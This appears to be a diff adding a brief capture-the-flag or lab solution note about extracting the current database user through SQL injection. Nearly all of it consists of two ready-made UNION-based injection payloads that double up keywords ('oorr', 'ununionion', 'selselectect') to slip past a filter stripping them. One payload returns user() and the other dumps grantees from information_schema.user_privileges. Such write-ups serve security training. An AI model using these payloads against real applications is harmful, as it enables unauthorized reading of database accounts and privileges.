@@ -1,0 +1,7 @@
+This question is very similar to dbName question.
+Instead of database() just replace it with user()
+
+SQL Query - ' oorr 1 ununionion (selselectect null,user(),null,null,null,null,null,null,null,null,null,null,null,null) -- -
+We can also get users from the following query.
+SQL Query - ' oorr 1 ununionion (selselectect null,(SEselectLECT group_concat(grantee)
+FROM infoorrmation_schema.user_privileges),null,null,null,null,null,null,null,null,null,null,null,null) -- -
